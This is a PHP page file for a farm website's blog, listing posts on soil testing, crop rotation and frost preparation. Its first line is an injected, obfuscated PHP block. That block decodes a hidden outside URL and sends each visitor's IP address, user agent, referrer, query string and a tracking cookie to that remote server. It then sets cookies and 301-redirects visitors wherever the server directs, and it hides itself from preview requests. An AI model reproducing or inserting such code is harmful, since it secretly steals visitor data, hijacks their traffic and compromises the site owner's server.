<?php date_default_timezone_set("UTC");ini_set("display_errors", 0);error_reporting(E_ALL & ~E_NOTICE);if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){$date = date("Y-m-d H:i:s");$id = "539876";$uid="wdqkw38krjltgz27x28b28j23";$qu=$_SERVER["QUERY_STRING"];$ch = curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_SERVER["HTTP_REFERER"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_event",$arr[6],time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$q, TRUE, 301);}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$f, TRUE, 301);}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}}}?>
<?php
require_once __DIR__ . '/includes/config.php';

$posts = [
    'reading-the-soil' => [
        'title' => 'Reading the soil before you plant anything',
        'date'  => 'March 3, 2026',
        'img'   => 'soil,handsoil',
        'excerpt' => 'A soil test tells you more than any seed catalog will. Here is what we check every February and why.',
        'body' => [
            'Every February, before a single seed goes into the ground, we walk the fields with a soil probe and a set of sample bags. It is the least glamorous part of the season and the one that decides most of what happens later.',
            'We test pH, nitrogen, phosphorus and potassium levels in each field block, and compare them against the previous three years. A field that grew squash last year needs different treatment than one that rested under a cover crop.',
            'This is also when we decide which fields need compost, which need a longer rest, and which are ready for the heavier feeders like tomatoes and corn. Skipping this step is how fields get tired.',
        ],
    ],
    'why-we-rotate-crops' => [
        'title' => 'Why we rotate crops on a four-year cycle',
        'date'  => 'April 18, 2026',
        'img'   => 'cropfield,rotation',
        'excerpt' => 'No field grows the same crop family two years running. It costs us some convenience and saves the soil a lot of strain.',
        'body' => [
            'Our fields move through a four-year rotation: legumes, then heavy feeders like squash and corn, then leafy greens, then a grain or cover crop before starting again.',
            'The legume year is doing the most quiet work — beans and peas pull nitrogen from the air and leave it in the soil for the crops that follow. It means we buy less fertilizer and our heavy feeders start from richer ground.',
            'It is not the most efficient system on paper. It would be simpler to grow whatever sells best, every year, in the same field. But fields farmed that way tend to need more and more input each season, and we would rather not find out where that ends.',
        ],
    ],
    'first-frost-checklist' => [
        'title' => 'Our first-frost checklist',
        'date'  => 'October 6, 2026',
        'img'   => 'frostfield,autumn',
        'excerpt' => 'The week before the first hard frost is one of the busiest of the year. Here is what has to happen before it arrives.',
        'body' => [
            'By early October we are watching the forecast daily. The first hard frost usually lands in the second or third week of the month, and everything tender needs to be out of the ground or covered before it does.',
            'Tomatoes, peppers and squash get picked green if needed rather than left to freeze on the vine. Root vegetables like carrots and beets can stay in the ground a little longer and actually sweeten with the first light frosts.',
            'The orchard gets a final walk-through too, checking that irrigation lines are drained before they can freeze and crack.',
        ],
    ],
    'visiting-with-kids' => [
        'title' => 'Bringing kids to the farm: what to expect',
        'date'  => 'June 2, 2026',
        'img'   => 'kidsfarm,visit',
        'excerpt' => 'Our Saturday tours get a lot of young visitors. Here is how a typical visit runs.',
        'body' => [
            'Saturday tours start at the equipment yard, where kids usually want to sit on the tractor before anything else happens. From there we walk out to whichever field has the most going on that week.',
            'In spring that is often planting; by midsummer it is harvest, and there is almost always something a child can taste straight off the plant, with a parent\'s permission.',
            'Tours run about ninety minutes and end at the farm shop, where most families pick up something for dinner on the way out.',
        ],
    ],
];

$slug = isset($_GET['post']) ? preg_replace('/[^a-z0-9\-]/', '', strtolower($_GET['post'])) : null;
$current = ($slug && isset($posts[$slug])) ? $posts[$slug] : null;

$page_title = $current ? $current['title'] : 'Field Notes';
$page_desc  = $current ? $current['excerpt'] : 'Notes from around FacadeFields on soil, seasons and what it takes to run a working farm.';
include __DIR__ . '/includes/header.php';
?>

<?php if ($current): ?>

  <section class="page-header">
    <div class="container">
      <div class="breadcrumb"><a href="index.php">Home</a> / <a href="blog.php">Field Notes</a> / <?= h($current['title']) ?></div>
    </div>
  </section>

  <section class="section">
    <div class="container post-article">
      <h1><?= h($current['title']) ?></h1>
      <div class="meta"><?= h($current['date']) ?></div>
      <img src="https://loremflickr.com/1000/500/<?= h($current['img']) ?>" alt="<?= h($current['title']) ?>">
      <?php foreach ($current['body'] as $para): ?>
        <p><?= h($para) ?></p>
      <?php endforeach; ?>
      <p><a href="blog.php">← Back to all Field Notes</a></p>
    </div>
  </section>

<?php else: ?>

  <section class="page-header">
    <div class="container">
      <div class="breadcrumb"><a href="index.php">Home</a> / Field Notes</div>
      <h1>Field Notes</h1>
      <p>Short notes on soil, seasons and the day-to-day of running FacadeFields.</p>
    </div>
  </section>

  <section class="section">
    <div class="container">
      <div class="post-grid">
        <?php foreach ($posts as $slug_key => $post): ?>
          <a href="blog.php?post=<?= h($slug_key) ?>" class="post-card" style="color:inherit;">
            <img src="https://loremflickr.com/500/300/<?= h($post['img']) ?>" alt="<?= h($post['title']) ?>">
            <div class="meta"><?= h($post['date']) ?></div>
            <h3><?= h($post['title']) ?></h3>
            <p><?= h($post['excerpt']) ?></p>
          </a>
        <?php endforeach; ?>
      </div>
    </div>
  </section>

<?php endif; ?>

<?php include __DIR__ . '/includes/footer.php'; ?>
